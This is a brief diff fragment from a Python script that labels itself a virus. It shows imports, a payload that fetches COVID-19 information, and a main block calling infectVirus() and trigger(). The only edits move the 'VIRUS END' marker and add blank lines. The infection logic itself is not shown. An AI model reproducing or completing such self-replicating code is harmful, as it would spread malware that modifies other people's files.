@@ -1,3 +1,4 @@
+
 ### -_- VIRUS -_- ###
 import glob,sys,re,base64,json,COVID19Py
 
@@ -54,8 +55,8 @@ def getCovidINFO():
 def payload():
     getCovidINFO()
 
-### -_- VIRUS END -_- ###
-
 if __name__ == "__main__":
     infectVirus()
     trigger()
+
+### -_- VIRUS END -_- ###
